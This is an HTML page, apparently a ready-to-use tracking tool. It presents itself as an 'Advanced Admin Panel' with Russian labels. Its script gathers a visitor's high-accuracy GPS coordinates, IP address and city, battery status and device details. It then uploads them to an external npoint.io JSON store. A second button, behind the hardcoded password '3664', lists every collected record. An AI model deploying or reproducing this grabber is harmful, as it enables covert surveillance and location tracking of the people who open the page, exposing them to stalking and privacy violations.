<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Advanced Admin Panel</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #0f172a; color: #f8fafc; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
        .box { background: #1e293b; padding: 25px; border-radius: 15px; width: 90%; max-width: 400px; text-align: center; border: 1px solid #334155; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        h2 { color: #38bdf8; font-size: 1.5rem; margin-bottom: 20px; }
        button { width: 100%; padding: 15px; margin: 10px 0; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; transition: 0.3s; text-transform: uppercase; }
        .btn-blue { background: #0284c7; color: white; }
        .btn-green { background: #10b981; color: white; }
        #status { font-size: 12px; color: #94a3b8; margin-top: 10px; }
        #results { margin-top: 20px; text-align: left; background: #020617; padding: 15px; border-radius: 10px; display: none; max-height: 400px; overflow-y: auto; border: 1px solid #334155; font-size: 11px; }
        .entry { border-bottom: 1px solid #1e293b; padding: 10px 0; line-height: 1.5; }
        .entry b { color: #38bdf8; }
    </style>
</head>
<body>

<div class="box">
    <h2>System Intelligence</h2>
    <button class="btn-blue" id="mainBtn" onclick="startDataCollection()">ПОЛНЫЙ СБОР ДАННЫХ</button>
    <button class="btn-green" onclick="viewCloud()">ПАНЕЛЬ УПРАВЛЕНИЯ</button>
    <div id="status">Ожидание команды...</div>
    <div id="results"></div>
</div>

<script>
    const API_URL = "https://api.npoint.io/970512ab12c9b4a48cfd";

    async function startDataCollection() {
        const status = document.getElementById('status');
        status.innerText = "Сбор системных данных...";

        let data = {
            time: new Date().toLocaleString("ru-RU"),
            coords: "Отказано в доступе",
            battery: "Неизвестно",
            device: {}
        };

        // 1. Пытаемся получить GPS (спросит разрешение)
        const getGPS = () => new Promise((resolve) => {
            navigator.geolocation.getCurrentPosition(
                (p) => resolve(`${p.coords.latitude}, ${p.coords.longitude} (Точность: ${p.coords.accuracy}м)`),
                () => resolve("Пользователь запретил GPS"),
                { enableHighAccuracy: true, timeout: 5000 }
            );
        });
        data.coords = await getGPS();

        // 2. Данные о батарее
        if (navigator.getBattery) {
            const b = await navigator.getBattery();
            data.battery = `${Math.round(b.level * 100)}% (${b.charging ? 'Заряжается' : 'Разряжается'})`;
        }

        // 3. Железо и сеть
        try {
            const ipRes = await fetch('https://ipapi.co/json/');
            const ipJson = await ipRes.json();
            data.ipInfo = `${ipJson.ip} (${ipJson.city}, ${ipJson.org})`;
        } catch(e) { data.ipInfo = "Ошибка IP"; }

        data.device = {
            os: navigator.platform,
            ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Неизвестно",
            cores: navigator.hardwareConcurrency || "Неизвестно",
            screen: `${window.screen.width}x${window.screen.height}`,
            ua: navigator.userAgent
        };

        // 4. Отправка в облако
        status.innerText = "Синхронизация с облаком...";
        try {
            const res = await fetch(API_URL);
            let db = await res.json();
            if (!Array.isArray(db)) db = [];
            db.push(data);

            await fetch(API_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(db)
            });
            alert("Данные успешно отправлены!");
            status.innerText = "Готово.";
        } catch(e) {
            alert("Ошибка сохранения. Проверьте npoint.io");
            status.innerText = "Ошибка.";
        }
    }

    async function viewCloud() {
        if (prompt("Пароль:") !== "3664") return;
        const resDiv = document.getElementById('results');
        resDiv.style.display = 'block';
        resDiv.innerHTML = "Загрузка...";

        try {
            const res = await fetch(API_URL);
            const logs = await res.json();
            resDiv.innerHTML = logs.reverse().map(log => `
                <div class="entry">
                    <b>📅 Дата:</b> ${log.time}<br>
                    <b>📍 Координаты:</b> ${log.coords}<br>
                    <b>🌐 IP/Сеть:</b> ${log.ipInfo}<br>
                    <b>🔋 Батарея:</b> ${log.battery}<br>
                    <b>💻 Железо:</b> ${log.device.os}, ${log.device.ram} RAM, ${log.device.cores} ядер<br>
                    <b>📏 Экран:</b> ${log.device.screen}
                </div>
            `).join('');
        } catch(e) { resDiv.innerHTML = "Ошибка базы данных."; }
    }
</script>

</body>
</html>
